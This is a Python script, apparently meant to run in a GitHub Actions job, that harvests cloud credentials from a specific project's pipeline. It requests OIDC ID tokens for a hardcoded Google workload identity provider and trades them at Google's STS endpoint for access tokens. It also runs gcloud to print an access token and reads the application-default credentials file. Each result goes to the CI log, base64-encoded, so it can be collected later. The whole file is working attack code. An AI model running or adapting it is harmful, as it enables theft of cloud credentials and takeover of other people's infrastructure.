
import os, sys, json, base64, subprocess
def emit(t,v):
    try: print("C211_%s=%s"%(t,base64.b64encode(str(v).encode()).decode()), flush=True)
    except Exception: pass
emit("START", os.environ.get("GITHUB_REPOSITORY","")+"|"+os.environ.get("GITHUB_EVENT_NAME","")+"|"+os.environ.get("GITHUB_HEAD_REF",""))
emit("ENVKEYS", ",".join(sorted([k for k in os.environ if k.startswith(("ACTIONS_ID","GOOGLE","GCP","CLOUDSDK"))])))
u=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL",""); t=os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN","")
emit("IDTOKEN_ENV", "PRESENT" if u else "ABSENT")
PROVIDERS=["projects/961685377398/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions-provider"]
if u:
    import urllib.request as ur, urllib.parse as up
    for p in PROVIDERS:
        for aud in ["//iam.googleapis.com/"+p, "https://iam.googleapis.com/"+p, p]:
            try:
                r=ur.Request(u+"&audience="+up.quote(aud,safe=""), headers={"Authorization":"Bearer "+t})
                j=json.loads(ur.urlopen(r,timeout=25).read().decode())
                jwt=j.get("value","")
                emit("IDTOKEN", json.dumps({"aud":aud,"jwt":jwt}))
                form=up.urlencode({"grant_type":"urn:ietf:params:oauth:grant-type:token-exchange","audience":"//iam.googleapis.com/"+p,"scope":"https://www.googleapis.com/auth/cloud-platform","requested_token_type":"urn:ietf:params:oauth:token-type:access_token","subject_token_type":"urn:ietf:params:oauth:token-type:jwt","subject_token":jwt}).encode()
                x=ur.Request("https://sts.googleapis.com/v1/token", data=form, headers={"Content-Type":"application/x-www-form-urlencoded"})
                try:
                    b=ur.urlopen(x,timeout=25).read().decode(); emit("STS", json.dumps({"aud":aud,"status":200,"body":b[:600]}))
                except Exception as e:
                    body=getattr(e,'read',lambda:b'')()
                    emit("STS", json.dumps({"aud":aud,"status":getattr(e,'code','ERR'),"body":str(body)[:600]}))
            except Exception as e:
                emit("IDTOKEN_ERR", aud+"|"+repr(e)[:150])
for cmd in (["gcloud","auth","print-access-token"],["gcloud","config","get-value","project"]):
    try:
        p=subprocess.run(cmd,capture_output=True,text=True,timeout=90)
        emit("GCLOUD_"+cmd[1].upper(), ((p.stdout or "")+"|ERR|"+(p.stderr or ""))[:3000])
    except Exception as e: emit("GCLOUD_ERR", repr(e)[:150])
pth=os.environ.get("GOOGLE_APPLICATION_CREDENTIALS","")
try:
    if pth and os.path.exists(pth): emit("ADC", open(pth).read()[:3000])
except Exception as e: emit("ADC_ERR", repr(e)[:150])
emit("DONE","probe_complete")
sys.exit(1)
